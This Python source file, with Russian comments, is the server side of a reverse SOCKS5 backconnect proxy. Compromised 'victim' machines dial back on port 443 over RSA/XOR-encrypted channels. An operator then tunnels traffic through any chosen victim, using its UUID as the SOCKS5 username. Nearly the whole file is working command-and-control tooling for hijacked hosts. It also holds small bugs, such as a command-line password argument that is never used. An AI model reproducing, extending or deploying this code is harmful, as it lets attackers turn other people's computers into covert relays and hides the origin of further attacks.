from __future__ import annotations
import rsa
import logging
from typing import Optional, Dict, Union
import socket
from threading import RLock
from time import sleep
from common.socks5.const import *
from common.const import *
from common.backend import spawn, joinall, StreamServer, relay
from common.mytypes import Address, AnyBytes
from common.connection import Socket, ProtocolViolationError, different_bytes
from common.encryption import XORStreamCipher, XORBlockCipher
from secrets import token_bytes
from bcrpserver.const import *
import signal


rsa.key.log.disabled = True  # отключить логирование
logging.basicConfig(level="DEBUG")
logger = logging.getLogger()


class Tunnel:
    victim: Victim
    tid: bytes
    src: Optional[Socket]
    dst: Optional[Socket]
    src_addr: Address
    encryption_key: bytes
    decryption_key: bytes
    encryption: XORStreamCipher
    cipher_ok: bytes
    relayed: bool

    def __init__(self, victim: Victim, src: Socket, src_addr: Address) -> None:

        tid = token_bytes()
        while victim.server.has_tunnel(tid):  # чтобы не было повторных айди туннеля
            tid = token_bytes(TUNNEL_ID_LENGTH)

        decryption_key = token_bytes(STREAM_KEY_LENGTH)
        encryption_key = token_bytes(STREAM_KEY_LENGTH)
        cipher_ok = token_bytes(STATUS_MESSAGE_LENGTH)
        encryption = XORStreamCipher(encryption_key, decryption_key)

        self.victim = victim
        self.tid = tid
        self.src = src
        self.src_addr = src_addr
        self.encryption = encryption
        self.encryption_key = encryption_key
        self.decryption_key = decryption_key
        self.cipher_ok = cipher_ok
        self.dst = None
        self.relayed = False

    def close(self):
        self.close_src()
        self.close_dst()

    def close_src(self):
        if self.src:
            self.src.close()
            self.src = None

    def close_dst(self):
        if self.dst:
            self.dst.close()
            self.dst = None

    def handshake(self, dst) -> bool:
        def f(msg) -> str:
            return f"[Tunnel.relay_setup] {msg}"

        dst.set_encryption(self.encryption)
        secret = token_bytes(16)
        dst.send_msg(secret)
        recv_secret = dst.recv_msg()
        if recv_secret == secret:
            dst.send_msg(self.cipher_ok)
            self.dst = dst
            self.relayed = True
        else:
            dst.send_msg(different_bytes(self.cipher_ok))
            dst.close()
            self.relayed = False
        if self.victim.server.has_tunnel(self.tid):
            self.victim.server.remove_tunnel(self.tid)  # удалить из списка ожидаемых туннелей
        # проброс настроен. Могла произойти ошибка, тогда relayed == False
        return self.relayed

    def relay(self) -> None:
        relay(self.src, self.dst, BUFFER_SIZE, TUNNEL_TIMEOUT)
        self.close_src()
        self.close_dst()


class Victim:
    server: MasterServer
    public_key: rsa.PublicKey
    private_key: rsa.PrivateKey
    master_socket: Optional[Socket]
    uuid: Optional[bytes]
    master_lock: RLock
    host: str
    port: int

    new_tunnel_req: Optional[AnyBytes]
    reconnect_req: Optional[AnyBytes]
    ping_req: Optional[AnyBytes]
    pong_resp: Optional[AnyBytes]

    def __init__(self, server: MasterServer, master_socket: Socket, addr: Address) -> None:
        self.server = server
        # генерируем пару ключей для данного мастер соединения
        self.public_key, self.private_key = rsa.newkeys(RSA_KEY_LENGTH,
                                                        accurate=True, poolsize=1, exponent=65537)
        self.master_socket = master_socket
        self.host, self.port = addr
        self.uuid = None
        self.master_lock = RLock()  # защита от одновременной пересылки сообщений не в том порядке

        self.new_tunnel_req = None
        self.reconnect_req = None
        self.ping_req = None
        self.pong_resp = None

    def is_connected(self) -> bool:
        return self.master_socket is not None and self.master_socket.is_open()

    def close_master_socket(self) -> None:
        self.master_socket.close()
        self.master_socket = None

    def handshake(self) -> bool:
        """
        функция договаривается о шифровании на мастер канале
        :return: удачно прошло или нет
        """
        # принять соединение
        self.master_socket.send_msg(HANDSHAKE_SUCCESS)
        n = self.public_key.n
        e = self.public_key.e
        self.master_socket.send_int(n, order="big", signed=False)
        self.master_socket.send_int(e, order="big", signed=False)
        self.master_socket.send_int(MASTER_HANDSHAKE_MESSAGE_LENGTH, order="big", signed=False)
        self.master_socket.send_int(STREAM_KEY_LENGTH, order="big", signed=False)

        # ключи меняются местами для сервера
        decryption_key = self.master_socket.recv_msg()
        if not decryption_key:
            self.close_master_socket()
            return False
        decryption_key = rsa.decrypt(decryption_key, self.private_key)

        encryption_key = self.master_socket.recv_msg()
        if not encryption_key:
            self.close_master_socket()
            return False
        encryption_key = rsa.decrypt(encryption_key, self.private_key)

        status_ok = self.master_socket.recv_msg()
        if not status_ok:
            self.close_master_socket()
            return False
        status_ok = rsa.decrypt(status_ok, self.private_key)

        cipher = XORStreamCipher(ek=encryption_key, dk=decryption_key)
        self.master_socket.set_encryption(cipher)

        secret = token_bytes(SECRET_LENGTH)
        self.master_socket.send_msg(secret)
        recv_secret = self.master_socket.recv_msg()
        if recv_secret == secret:
            self.master_socket.send_msg(status_ok)
        else:
            status_bad = different_bytes(status_ok)
            self.master_socket.send_msg(status_bad)
            self.close_master_socket()
            return False

        uuid = self.master_socket.recv_msg()
        uuid = rsa.decrypt(uuid, self.private_key)
        self.uuid = uuid

        status_ok = self.master_socket.recv_msg()
        if self.server.has_victim(self.uuid):
            self.master_socket.send_msg(different_bytes(status_ok))
            self.close_master_socket()
            self.remove_self()
            return False
        else:
            self.master_socket.send_msg(status_ok)

            while len({self.new_tunnel_req, self.ping_req, self.reconnect_req, self.pong_resp}) != 4:
                self.new_tunnel_req = token_bytes(REQUEST_MESSAGE_LENGTH)
                self.ping_req = token_bytes(REQUEST_MESSAGE_LENGTH)
                self.reconnect_req = token_bytes(REQUEST_MESSAGE_LENGTH)
                self.pong_resp = token_bytes(PONG_RESPONSE_LENGTH)
                # генерировать случайно, пока не попадутся все разные

            self.master_socket.send_msg(self.new_tunnel_req)
            self.master_socket.send_msg(self.ping_req)
            self.master_socket.send_msg(self.reconnect_req)
            self.master_socket.send_msg(self.pong_resp)

            server_print(f"new victim master connection: {uuid.hex()} @ {self.host}:{self.port}.")
            return True

    def ping_forever(self):
        try:
            while self.is_connected():
                with self.master_lock:  # защита
                    self.master_socket.send_msg(self.ping_req)
                response = self.master_socket.recv_msg()
                if not response or response != self.pong_resp:
                    self.close_master_socket()
                else:
                    sleep(PING_INTERVAL)
        finally:  # удалить себя из списка, т.к. жертва больше не отвечает на пинги
            self.remove_self()

    def remove_self(self):
        if self.server.has_victim(self.uuid):
            self.server.remove_victim(self.uuid)


class MasterServer(StreamServer):
    """
    Служит для запросов новых TCP сокет соединений от компьютеров жертв.
    """
    host: str
    port: int
    revps: ReverseProxyServer
    victims: Dict[str, Victim]
    awaited_tunnels: Dict[str, Tunnel]
    serving: bool

    def has_victim(self, uuid: Union[bytes, bytearray]) -> bool:
        return uuid.hex() in self.victims

    def add_victim(self, v: Victim) -> None:
        self.victims[v.uuid.hex()] = v

    def remove_victim(self, uuid: Union[bytes, bytearray]) -> None:
        del self.victims[uuid.hex()]

    def get_victim(self, uuid: Union[bytes, bytearray]) -> Victim:
        return self.victims[uuid.hex()]

    def has_tunnel(self, tid: Union[bytes, bytearray]) -> bool:
        return tid.hex() in self.awaited_tunnels

    def add_tunnel(self, t: Tunnel):
        self.awaited_tunnels[t.tid.hex()] = t

    def remove_tunnel(self, tid: Union[bytes, bytearray]) -> None:
        del self.awaited_tunnels[tid.hex()]

    def get_tunnel(self, tid: Union[bytes, bytearray]) -> Tunnel:
        return self.awaited_tunnels[tid.hex()]

    def handle(self, conn: socket.socket, addr: Address) -> None:
        def f(msg) -> str:
            return f"[MasterServer.handle] {msg}"

        conn = Socket(conn)
        try:
            handshake_message = conn.recv_msg()  # пока что без шифрования
            if handshake_message == MASTER_SIGNAL:
                # здесь происходит подсоединение новой жертвы к серверу
                victim = Victim(self, conn, addr)
                handshake_result = victim.handshake()
                if not handshake_result:
                    return
                self.add_victim(victim)
                victim.ping_forever()
                # от клиента мы получаем только понги
            elif handshake_message == TUNNEL_SIGNAL:
                # здесь происходит проброс туннеля от жертвы к клиенту
                tid = conn.recv_msg()
                if not self.has_tunnel(tid):
                    conn.send_msg(HANDSHAKE_FAILURE)
                    conn.close()
                    return
                else:
                    tunnel = self.get_tunnel(tid)
                    # сообщаем клиенту, что тоннель в порядке
                    conn.send_msg(HANDSHAKE_SUCCESS)
                relayed = tunnel.handshake(conn)  # настройка шифрования на релее
                if not relayed:  # если проброс не удался
                    reply = form_socks5_reply(SERVER_FAILURE_REPLY, IPv4_ADDRESS_TYPE, EMPTY_IPv4, PORT_0)
                    tunnel.src.send_raw(reply)  # для клиента это выглядит как обычное socks5 соединение
                    tunnel.close()
                    return
                # если все ок, то можно гнать трафик
                tunnel.relay()
            else:
                logger.error(f(f"Unknown message code: {handshake_message}"))
                conn.close()
        except socket.error as ex:
            logger.error(f(f"Socket error: {ex}"))
        except ProtocolViolationError as ex:
            logger.error(f(f"Protocol violation: {ex}"))
        except Exception as ex:
            logger.error(f(f"Unknown error: {ex}"))
        finally:
            conn.close()

    def __init__(self, revps: ReverseProxyServer):
        self.host = revps.reverse_host
        self.port = revps.reverse_port
        server_print(f"victims @ {self.host}:{self.port}.")
        super().__init__((self.host, self.port))
        self.revps = revps
        self.victims = dict()
        self.awaited_tunnels = dict()


class ReverseProxyServer(StreamServer):
    """
    Получает соединения от хоста, который хочет установить обратное прокси соединение к жертве.
    """
    reverse_host: str
    reverse_port: int
    host: str
    port: int
    password: str

    master_server: MasterServer

    def handle(self, src: socket.socket, addr: Address) -> None:
        def f(msg) -> str:
            return f"[ReverseProxyServer.handle] {msg}"

        logger.debug(f(f"New proxy server connection: {addr[0]}:{addr[1]}."))

        src = Socket(src, encryption=None)
        try:
            version = src.recv_raw(1)
            if not version:
                src.close()
                return
            if version != PROTOCOL_VERSION:
                src.send_raw(HANDSHAKE_FAILURE_MESSAGE)
                src.close()
                return

            nmethods = src.recv_raw(1)
            if not nmethods:
                # no response
                src.close()
                return
            nmethods = nmethods[0]  # converts byte to integer
            if nmethods < 1:
                # invalid nmethods length
                src.send_raw(HANDSHAKE_FAILURE_MESSAGE)
                src.close()
                return

            methods = src.recv_raw(nmethods)
            if len(methods) != nmethods:
                # received wrong number of methods -> client misconfiguration or bad handshake
                src.send_raw(HANDSHAKE_FAILURE_MESSAGE)
                src.close()
                return
            if USERNAME_PASSWORD_METHOD not in methods:
                # client doesn't support server's acceptable authentication method
                src.send_raw(HANDSHAKE_FAILURE_MESSAGE)
                src.close()
                return
            # server agrees with one of the authentication methods proposed by the client
            src.send_raw(PROTOCOL_VERSION + USERNAME_PASSWORD_METHOD)

            # теперь авторизация
            subnegotiation_version = src.recv_raw(1)
            if not subnegotiation_version:
                # client didn't send anything
                src.close()
                return
            if subnegotiation_version != b'\x01':
                # client bad response
                src.send_raw(USERNAME_PASSWORD_AUTH_FAILED)
                src.close()
                return

            username_length = src.recv_raw(1)
            if not username_length:
                src.close()
                return None
            username_length = username_length[0]  # now int
            if username_length < 1:
                src.send_raw(USERNAME_PASSWORD_AUTH_FAILED)
                src.close()
                return

            # recv username
            username = src.recv_raw(username_length)
            if not username or len(username) != username_length:
                src.close()
                return None
            username = username.decode("utf-8")
            # here it doesn't matter, if we use UTF-8, ANSI or ASCII,
            # because for latin + alphanumeric + signs they are identically encoded
            if username not in self.master_server.victims:
                src.send_raw(USERNAME_PASSWORD_AUTH_FAILED)
                src.close()
                return

            # recv password length
            password_length = src.recv_raw(1)
            if not password_length:
                src.close()
                return
            password_length = password_length[0]  # now int
            if password_length < 1:
                src.send_raw(USERNAME_PASSWORD_AUTH_FAILED)
                src.close()
                return

            # recv password
            password = src.recv_raw(password_length)
            if not password or len(password) != password_length:
                src.close()
                return
            password = password.decode("utf-8")
            if password != self.password:
                src.send_raw(USERNAME_PASSWORD_AUTH_FAILED)
                src.close()
                return

            # if it came through, the client is good
            src.send_raw(USERNAME_PASSWORD_AUTH_SUCCESS)

            # это жертва, через которую будет проходить трафик
            victim = self.master_server.victims[username]

            # создание тоннеля
            tunnel = Tunnel(victim, src, addr)  # это туннель обратного прокси соединения
            self.master_server.add_tunnel(tunnel)  # дабавляем в пул туннелей, ожидаюших соединения
            with victim.master_lock:  # защита, чтобы сообщения передались последовательно
                xor = XORBlockCipher(victim.uuid)
                victim.master_socket.send_msg(victim.new_tunnel_req)
                victim.master_socket.send_msg(xor.encrypt(tunnel.tid))
                # сервер меняет местами
                victim.master_socket.send_msg(tunnel.decryption_key)  # для сервера расшифровка - для клиента шифрование
                victim.master_socket.send_msg(tunnel.encryption_key)  # и наоборот
                victim.master_socket.send_msg(tunnel.cipher_ok)

            # но он еще не готов: нужно дождаться второй части инициализации тоннеля
            sleep(TUNNEL_TIMEOUT)  # ждем таймаут
            if self.master_server.has_tunnel(tunnel.tid):
                self.master_server.remove_tunnel(tunnel.tid)  # удалить из списка ожидаемых туннелей

            # если спустя таймаут туннель не пробросился, то стоит его просто закрыть
            if not tunnel.relayed:
                # если проброса не произошло, то сообщим клиенту, что не вышло
                if tunnel.src and tunnel.src.is_open():
                    reply = form_socks5_reply(NETWORK_UNREACHABLE_REPLY, IPv4_ADDRESS_TYPE, EMPTY_IPv4, PORT_0)
                    tunnel.src.send_raw(reply)  # для клиента это выглядит как обычное socks5 соединение
                tunnel.close()
                logger.error(f(f"Tunnel {tunnel.tid.hex()} timed out."))
                return
        except socket.error as err:
            logger.error(f(f"{err} from {addr[0]}:{addr[1]}"))
        except ProtocolViolationError as err:
            logger.error(f(f"{err} from {addr[0]}:{addr[1]}"))
        except Exception as err:
            logger.error(f(f"{err} from {addr[0]}:{addr[1]}"))

    def __init__(self, reverse_addr: Address, proxy_addr: Address, password: str) -> None:
        """
        :param reverse_addr:
        :param proxy_addr:
        """
        reverse_host, reverse_port = reverse_addr
        self.host, self.port = proxy_addr
        assert reverse_port != self.port
        super().__init__((self.host, self.port))
        self.reverse_host = reverse_host
        self.reverse_port = reverse_port
        server_print(f"clients @ {self.host}:{self.port}.")
        self.password = password
        server_print(f"password for the socks5 proxy server is: '{self.password}'.")
        server_print(f"to connect to a victim, use its UUID and server's password as socks5 credentials.")
        self.master_server = MasterServer(self)

    def serve_forever(self):
        # запускает 2 сервера сразу
        server_print("running.")
        joinall([
            spawn(super().serve_forever),
            spawn(self.master_server.serve_forever)
        ], start=False)

    def close(self):
        # останавливает сразу 2 сервера
        self.master_server.close()
        super().close()


def server_print(msg):
    print(f"[SERVER] {msg}")


def print_help():
    print("Accepted argument schemes:")
    print("\tNo arguments (defaults will be used)")
    print("\t<reverse_host>:<reverse_port> <proxy_host>:<proxy_port>")
    print("\t<reverse_host>:<reverse_port> <proxy_host>:<proxy_port> <password>")
    print("where")
    print("\t<reverse_host>:<reverse_port> string is for victims' back connection to the server;")
    print("\t<proxy_host>:<proxy_port> string is for clients' forward connection to the proxy server;")
    print("\t<password> string is the password used for connecting to the proxy server.")
    print()
    print("Default values are:")
    print("\treverse_host: 0.0.0.0")
    print("\treverse_port: 443")
    print("\tproxy_host: 0.0.0.0")
    print("\tproxy_port: 1080")
    print("\tpassword: password")
    print()
    print("Use '-h' or '--help' to see this message again.")


if __name__ == "__main__":
    import sys

    args = sys.argv[1:]
    if len(args) == 1 and args[0].lower() in {"--help", "-h"}:
        print_help()
        sys.exit(0)

    rh = "127.0.0.1"
    rp = 443

    ph = "127.0.0.1"
    pp = 1080

    pwrd = "password"

    if len(args) != 0 not in {0, 2, 3}:
        print(f"Wrong number of arguments: {len(args)}.")
        print_help()
        sys.exit(-1)

    if len(args) in {2, 3}:
        rh, rp = args[0].rsplit(":", 1)
        try:
            rp = int(rp)
            assert 0 < rp < 65536
        except ValueError:
            print(f"Unable to parse value to port number: {rp}.")
            sys.exit(-1)
        ph, pp = args[1].rsplit(":", 1)
        try:
            pp = int(pp)
            assert 0 < pp < 65536
        except ValueError:
            print(f"Unable to parse value to port number: {pp}.")
            sys.exit(-1)
    if len(args) == 3:
        password = args[2]

    server = ReverseProxyServer(
        reverse_addr=(rh, rp),
        proxy_addr=(ph, pp),
        password=pwrd
    )

    def stop_server(sig, frame):
        server_print("Stopping.")
        server.close()
        server_print("Stopped.")
        sys.exit(0)

    signal.signal(signal.SIGTERM, stop_server)
    signal.signal(signal.SIGINT, stop_server)
    server.serve_forever()
